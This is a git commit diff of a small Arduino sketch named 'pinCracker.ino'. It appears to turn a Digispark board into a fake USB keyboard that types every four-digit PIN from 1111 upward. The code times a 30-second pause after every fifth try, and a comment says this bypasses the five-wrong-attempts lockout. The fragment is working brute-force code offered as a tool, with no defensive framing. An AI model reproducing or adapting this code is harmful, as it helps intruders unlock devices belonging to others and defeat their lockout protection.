5670d8404d48186508fa146cebb44e3ced7fe898
Ali Karimi <82864026+Liwyd@users.noreply.github.com>
2024-02-01 23:10:05 +0330

    pinCracker.ino

--- pinCracker.ino
+++ pinCracker.ino
@@ -1,5 +1,5 @@
 #include <DigiCombo.h>
-void setup(){pinMode(1, OUTPUT);for(int i = 0; i < 256; i++){analogWrite(1, i);delay(10);}DigiCombo.begin();DigiCombo.delay(1000);DigiCombo.print("1111\n");DigiCombo.delay(400);DigiCombo.print("1111\n");DigiCombo.delay(800);for (int i = 1112, counter = 0; i < 10000; i++, counter++){
+void setup(){pinMode(1, OUTPUT);for(int i = 0; i < 256; i++){analogWrite(1, i);delay(10);}DigiCombo.begin();DigiCombo.delay(1000);DigiCombo.print("1111\n");DigiCombo.delay(400);DigiCombo.print("1111\n");DigiCombo.delay(800);for (int i = 1112, counter = 1; i < 10000; i++, counter++){
 // -------------------------------------------------------------------------------------------------------
 if (!(counter % 5))DigiCombo.delay(30000); // this line if you bypass the password limit(5 wrong attempts)
 // -------------------------------------------------------------------------------------------------------
